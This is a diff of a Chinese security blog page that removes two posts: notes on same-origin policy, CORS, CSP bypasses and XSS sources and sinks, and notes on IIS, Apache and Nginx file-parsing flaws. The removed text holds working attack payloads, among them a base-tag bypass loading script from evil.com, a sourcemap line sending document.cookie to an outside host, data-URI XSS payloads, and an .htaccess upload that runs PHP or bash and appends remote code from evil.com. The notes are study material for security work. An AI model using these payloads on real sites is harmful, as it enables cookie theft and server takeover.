-<h2 id="跨源脚本API访问"><a href="#跨源脚本API访问" class="headerlink" title="跨源脚本API访问"></a>跨源脚本API访问</h2><p>Javascript的APIs中，如 <code>iframe.contentWindow</code> , <code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code>window</code> 和 <code>location</code> 对象的访问添加限制。</p>
-<p><code>window</code> 允许跨源访问的方法有</p>
-<ul>
-<li>window.blur</li>
-<li>window.close</li>
-<li>window.focus</li>
-<li>window.postMessage</li>
-</ul>
-<p><code>window</code> 允许跨源访问的属性有</p>
-<ul>
-<li>window.closed</li>
-<li>window.frames</li>
-<li>window.length</li>
-<li>window.location</li>
-<li>window.opener</li>
-<li>window.parent</li>
-<li>window.self</li>
-<li>window.top</li>
-<li>window.window</li>
-</ul>
-<p>其中 <code>window.location</code> 允许读&#x2F;写，其他的属性只允许读</p>
-<h2 id="跨源数据存储访问"><a href="#跨源数据存储访问" class="headerlink" title="跨源数据存储访问"></a>跨源数据存储访问</h2><p>存储在浏览器中的数据，如 <code>localStorage</code> 和 <code>IndexedDB</code>，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p>
-<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>CORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>
-<h2 id="常见请求头"><a href="#常见请求头" class="headerlink" title="常见请求头"></a>常见请求头</h2><ul>
-<li><ul>
-<li><p>Origin</p>
-<p>预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段<code>Origin: &lt;origin&gt;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Request-Method</p>
-<p>声明请求使用的方法<code>Access-Control-Request-Method: &lt;method&gt;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Request-Headers</p>
-<p>声明请求使用的header字段<code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="常见返回头"><a href="#常见返回头" class="headerlink" title="常见返回头"></a>常见返回头</h2><ul>
-<li><ul>
-<li><p>Access-Control-Allow-Origin</p>
-<p>声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 <code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Expose-Headers</p>
-<p>声明允许暴露的头e.g. <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Max-Age</p>
-<p>声明Cache时间<code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Allow-Credentials</p>
-<p>声明是否允许在请求中带入<code>Access-Control-Allow-Credentials: true</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Allow-Methods</p>
-<p>声明允许的访问方式<code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>Access-Control-Allow-Headers</p>
-<p>声明允许的头<code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="阻止跨源访问"><a href="#阻止跨源访问" class="headerlink" title="阻止跨源访问"></a>阻止跨源访问</h2><p>阻止跨域写操作，可以检测请求中的 <code>CSRF token</code> ，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。</p>
-<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 <code>Content-Type</code> 消息头。例如如果在HTML文档中指定 <code>&lt;script&gt;</code> 标记，则浏览器会尝试将HTML解析为JavaScript。</p>
-<h1 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h1><p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>CSP策略可以通过 HTTP 头信息或者 meta 元素定义。</p>
-<p>CSP 有三类：</p>
-<ul>
-<li>Content-Security-Policy (Google Chrome)</li>
-<li>X-Content-Security-Policy (Firefox)</li>
-<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP header :</span><br><span class="line">&quot;Content-Security-Policy:&quot; 策略</span><br><span class="line">&quot;Content-Security-Policy-Report-Only:&quot; 策略</span><br></pre></td></tr></table></figure>
-
-<p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>
-<p>HTML Meta :</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="指令说明"><a href="#指令说明" class="headerlink" title="指令说明"></a>指令说明</h3><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>default-src</td>
-<td>定义资源默认加载策略</td>
-</tr>
-<tr>
-<td>connect-src</td>
-<td>定义 Ajax、WebSocket 等加载策略</td>
-</tr>
-<tr>
-<td>font-src</td>
-<td>定义 Font 加载策略</td>
-</tr>
-<tr>
-<td>frame-src</td>
-<td>定义 Frame 加载策略</td>
-</tr>
-<tr>
-<td>img-src</td>
-<td>定义图片加载策略</td>
-</tr>
-<tr>
-<td>media-src</td>
-<td>定义 <audio>、<video> 等引用资源加载策略</td>
-</tr>
-<tr>
-<td>object-src</td>
-<td>定义 <applet>、<embed>、<object> 等引用资源加载策略</td>
-</tr>
-<tr>
-<td>script-src</td>
-<td>定义 JS 加载策略</td>
-</tr>
-<tr>
-<td>style-src</td>
-<td>定义 CSS 加载策略</td>
-</tr>
-<tr>
-<td>base-uri</td>
-<td>定义 <base> 根URL策略，不使用default-src作为默认值</td>
-</tr>
-<tr>
-<td>sandbox</td>
-<td>值为 allow-forms，对资源启用 sandbox</td>
-</tr>
-<tr>
-<td>report-uri</td>
-<td>值为 &#x2F;report-uri，提交日志</td>
-</tr>
-</tbody></table>
-<h3 id="4-2-4-2-2-关键字"><a href="#4-2-4-2-2-关键字" class="headerlink" title="4.2.4.2.2. 关键字"></a>4.2.4.2.2. 关键字</h3><ul>
-<li><ul>
-<li><p><code>-</code></p>
-<p>允许从任意url加载，除了 <code>data:</code> <code>blob:</code> <code>filesystem:</code> <code>schemes</code>e.g. <code>img-src -</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>none</code></p>
-<p>禁止从任何url加载资源e.g. <code>object-src &#39;none&#39;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>self</code></p>
-<p>只可以加载同源资源e.g. <code>img-src &#39;self&#39;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>data:</code></p>
-<p>可以通过data协议加载资源e.g. <code>img-src &#39;self&#39; data:</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>domain.example.com</code></p>
-<p>e.g. <code>img-src domain.example.com</code>只可以从特定的域加载资源</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>\*.example.com</code></p>
-<p>e.g. <code>img-src \*.example.com</code>可以从任意example.com的子域处加载资源</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>https://cdn.com</code></p>
-<p>e.g. <code>img-src https://cdn.com</code>只能从给定的域用https加载资源</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>https:</code></p>
-<p>e.g. <code>img-src https:</code>只能从任意域用https加载资源</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>unsafe-inline</code></p>
-<p>允许内部资源执行代码例如style attribute,onclick或者是sicript标签e.g. <code>script-src &#39;unsafe-inline&#39;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>unsafe-eval</code></p>
-<p>允许一些不安全的代码执行方式，例如js的eval()e.g. <code>script-src &#39;unsafe-eval&#39;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>nonce-&lt;base64-value&gt;&#39;</code></p>
-<p>使用随机的nonce，允许加载标签上nonce属性匹配的标签e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code></p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></p>
-<p>允许hash值匹配的代码块被执行e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="4-2-4-2-3-配置范例"><a href="#4-2-4-2-3-配置范例" class="headerlink" title="4.2.4.2.3. 配置范例"></a>4.2.4.2.3. 配置范例</h3><p>允许执行内联 JS 代码，但不允许加载外部资源</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="预加载"><a href="#预加载" class="headerlink" title="预加载"></a>预加载</h3><p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>
-<p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 预加载某个页面 --&gt;</span><br><span class="line">&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;</span><br><span class="line">&lt;!-- 预加载某个图片 --&gt;</span><br><span class="line">&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;</span><br><span class="line">&lt;!-- DNS 预解析 --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;</span><br><span class="line">&lt;!-- 特定文件类型预加载 --&gt;</span><br><span class="line">&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt;</span><br></pre></td></tr></table></figure>
-
-<p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p>
-<ul>
-<li>URL中包含下载资源</li>
-<li>页面中包含音频、视频</li>
-<li>POST、PUT和DELET操作的ajax请求</li>
-<li>HTTP认证</li>
-<li>HTTPS页面</li>
-<li>含恶意软件的页面</li>
-<li>弹窗页面</li>
-<li>占用资源很多的页面</li>
-<li>打开了chrome developer tools开发工具</li>
-</ul>
-<h3 id="MIME-sniff"><a href="#MIME-sniff" class="headerlink" title="MIME sniff"></a>MIME sniff</h3><p>举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再<code>&lt;script href=&#39;http://xxx.com/xx.jpg&#39;&gt;</code>，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本</p>
-<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>对于302跳转绕过CSP而言，实际上有以下几点限制：</p>
-<ul>
-<li>跳板必须在允许的域内。</li>
-<li>要加载的文件的host部分必须跟允许的域的host部分一致</li>
-</ul>
-<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当可以执行代码时，可以创建一个源为 <code>css</code> <code>js</code> 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 <code>../../../</code> <code>/%2e%2e%2f</code> 等可能触发服务器报错的链接也可以到达相应的目的。</p>
-<h3 id="base-uri"><a href="#base-uri" class="headerlink" title="base-uri"></a>base-uri</h3><p>当script-src为nonce或无限制，且base-uri无限制时，可通过 <code>base</code> 标签修改根URL来bypass，如下加载了<a target="_blank" rel="noopener" href="http://evil.com/main.js">http://evil.com/main.js</a></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;http://evil.com/&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;correct value&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
-<li><p>location 绕过</p>
-</li>
-<li><p>可上传SVG时，通过恶意SVG绕过同源站点</p>
-</li>
-<li><p>存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析</p>
-</li>
-<li><p>CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass</p>
-</li>
-<li><p>Angular versions &lt;1.5.9 &gt;&#x3D;1.5.0，存在漏洞 <a target="_blank" rel="noopener" href="https://github.com/angular/angular.js/pull/15346">Git Pull Request</a></p>
-</li>
-<li><ul>
-<li><p>jQuery sourcemap</p>
-<p><code>document.write(</code><script> //@        sourceMappingURL=<a target="_blank" rel="noopener" href="http://xxxx/%60+document.cookie+%60">http://xxxx/`+document.cookie+`</a></script><code>);`` </code></p>
-</li>
-</ul>
-</li>
-<li><p>a标签的ping属性</p>
-</li>
-<li><p>For FireFox <code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p>
-</li>
-<li><p><code>&lt;link rel=&quot;import&quot; /&gt;</code></p>
-</li>
-<li><p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></p>
-</li>
-<li><ul>
-<li><p>仅限制 <code>script-src</code> 时：</p>
-<p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="XSS数据源"><a href="#XSS数据源" class="headerlink" title="XSS数据源"></a>XSS数据源</h1><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul>
-<li><code>location</code></li>
-<li><code>location.href</code></li>
-<li><code>location.pathname</code></li>
-<li><code>location.search</code></li>
-<li><code>location.hash</code></li>
-<li><code>document.URL</code></li>
-<li><code>document.documentURI</code></li>
-<li><code>document.baseURI</code></li>
-</ul>
-<h2 id="Navigation"><a href="#Navigation" class="headerlink" title="Navigation"></a>Navigation</h2><ul>
-<li><code>window.name</code></li>
-<li><code>document.referrer</code></li>
-</ul>
-<h2 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h2><ul>
-<li><code>Ajax</code></li>
-<li><code>Fetch</code></li>
-<li><code>WebSocket</code></li>
-<li><code>PostMessage</code></li>
-</ul>
-<h2 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h2><ul>
-<li><code>Cookie</code></li>
-<li><code>LocalStorage</code></li>
-<li><code>SessionStorage</code></li>
-</ul>
-<h1 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h1><h2 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h2><ul>
-<li><p><code>eval(payload)</code></p>
-</li>
-<li><p><code>setTimeout(payload, 100)</code></p>
-</li>
-<li><p><code>setInterval(payload, 100)</code></p>
-</li>
-<li><p><code>Function(payload)()</code></p>
-</li>
-<li><p><code>&lt;script&gt;payload&lt;/script&gt;</code></p>
-</li>
-<li><p><code>&lt;img src=x onerror=payload&gt;</code></p>
-</li>
-</ul>
-<h2 id="加载URL"><a href="#加载URL" class="headerlink" title="加载URL"></a>加载URL</h2><ul>
-<li><code>location=javascript:alert(/xss/)</code></li>
-<li><code>location.href=javascript:alert(/xss/)</code></li>
-<li><code>location.assign(javascript:alert(/xss/))</code></li>
-<li><code>location.replace(javascript:alert(/xss/))</code></li>
-</ul>
-<h2 id="执行HTML"><a href="#执行HTML" class="headerlink" title="执行HTML"></a>执行HTML</h2><ul>
-<li><code>xx.innerHTML=payload</code></li>
-<li><code>xx.outerHTML=payload</code></li>
-<li><code>document.write(payload)</code></li>
-<li><code>document.writeln(payload)</code></li>
-</ul>
-<h1 id="xss保护"><a href="#xss保护" class="headerlink" title="xss保护"></a>xss保护</h1><h2 id="HTML过滤"><a href="#HTML过滤" class="headerlink" title="HTML过滤"></a>HTML过滤</h2><p>使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。</p>
-<h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options 响应头有三个可选的值：</p>
-<ul>
-<li><ul>
-<li><p>DENY</p>
-<p>页面不能被嵌入到任何iframe或frame中</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>SAMEORIGIN</p>
-<p>页面只能被本站页面嵌入到iframe或者frame中</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>ALLOW-FROM</p>
-<p>页面允许frame或frame加载</p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="XSS保护头"><a href="#XSS保护头" class="headerlink" title="XSS保护头"></a>XSS保护头</h2><p>基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>
-<p>而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。</p>
-<p>要设置浏览器的防护机制，则可使用X-XSS-Protection字段 该字段有三个可选的值</p>
-<ul>
-<li><code>0</code> : 表示关闭浏览器的XSS防护机制</li>
-<li><code>1</code> : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置</li>
-<li><code>1; mode=block</code> : 如果检测到恶意代码，在不渲染恶意代码</li>
-</ul>
-<p>FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/26/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.webp">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="frozenfish'blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2023/12/26/%E4%B8%AD%E9%97%B4%E4%BB%B6/" itemprop="url">中间件</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-12-26T02:01:50+08:00">
-                2023-12-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>[TOC]</p>
-<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><ul>
-<li><ul>
-<li><p>后缀解析 <code>/xx.asp;.jpg</code></p>
-<p>服务器默认不解析 <code>;</code> 号及其后面的内容，相当于截断。</p>
-</li>
-</ul>
-</li>
-<li><p>目录解析 <code>/xx.asp/xx.jpg</code> (xx.asp目录下任意解析)</p>
-</li>
-<li><p>默认解析 <code>xx.asa</code> <code>xx.cer</code> <code>xx.cdx</code></p>
-</li>
-<li><p>PROPFIND 栈溢出漏洞</p>
-</li>
-<li><p>RCE CVE-2017-7269</p>
-</li>
-</ul>
-<h2 id="IIS-7-0-7-5-Nginx"><a href="#IIS-7-0-7-5-Nginx" class="headerlink" title="IIS 7.0-7.5 &#x2F; Nginx &lt;&#x3D; 0.8.37"></a>IIS 7.0-7.5 &#x2F; Nginx &lt;&#x3D; 0.8.37</h2><p>在Fast-CGI开启状态下，在文件路径后加上 <code>/xx.php</code> ，即 <code>xx.jpg/xx.php</code> 会被解析为php文件。</p>
-<h2 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h2><ul>
-<li>开启WebDAV</li>
-<li>拥有来宾用户，且来宾用户拥有上传权限</li>
-<li>可任意文件上传</li>
-</ul>
-<h2 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h2><p>Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 <code>xx.php[空格]</code> ， <code>xx.php.</code>， <code>xx.php/</code>， <code>xx.php::$DATA</code> 上传脚本文件。</p>
-<h2 id="文件名猜解"><a href="#文件名猜解" class="headerlink" title="文件名猜解"></a>文件名猜解</h2><p>在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>
-<ul>
-<li>文件名为原文件名前6位字符加上 <code>~1</code> ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</li>
-<li>后缀名不超过3位，超过部分会被截断</li>
-<li>所有小写字母均转换成大写的字母</li>
-<li>文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</li>
-</ul>
-<p>IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。</p>
-<p>这种方法的局限性在于：</p>
-<ul>
-<li>文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报</li>
-<li>不支持中文文件名</li>
-</ul>
-<p>这种方法可以通过命令 <code>fsutil behavior set disable8dot3 1</code> 关闭NTFS 8.3文件格式的支持来修复。</p>
-<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="后缀解析"><a href="#后缀解析" class="headerlink" title="后缀解析"></a>后缀解析</h2><p><code>test.php.x1.x2.x3</code> （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>
-<h2 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h2><p>当AllowOverride被启用时，上传启用解析规则的.htaccess</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper &quot;/bin/bash&quot; .gif</span><br><span class="line">php_flag allow_url_include 1</span><br><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span><br><span class="line">#php_value auto_append_file https://evil.com/evil-code.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p>
-<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p><code>%0A</code> 绕过上传黑名单。</p>
-<h2 id="4-15-2-5-lighttpd"><a href="#4-15-2-5-lighttpd" class="headerlink" title="4.15.2.5. lighttpd"></a>4.15.2.5. lighttpd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGI关闭"><a href="#Fast-CGI关闭" class="headerlink" title="Fast-CGI关闭"></a>Fast-CGI关闭</h2><p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 <code>%00.php</code> ， 即 <code>xx.jpg%00.php</code> 会被当做 php 文件来解析</p>
-<h2 id="Fast-CGI开启"><a href="#Fast-CGI开启" class="headerlink" title="Fast-CGI开启"></a>Fast-CGI开启</h2><p>在Fast-CGI开启状态下，在文件路径后加上 <code>/xx.php</code> ，则 <code>xx.jpg/xx.php</code> 会被解析为php文件</p>
-<h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>如果配置中存在类似 <code>location /foo &#123; alias /bar/; &#125;</code> 的配置时，<code>/foo../</code> 会被解析为 <code>/bar/../</code> 从而导致目录穿越的发生。</p>
-<h3 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置中 <code>autoindex on</code> 开启时，Nginx中存在目录遍历漏洞。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2262,7 +2044,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2308,7 +2090,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
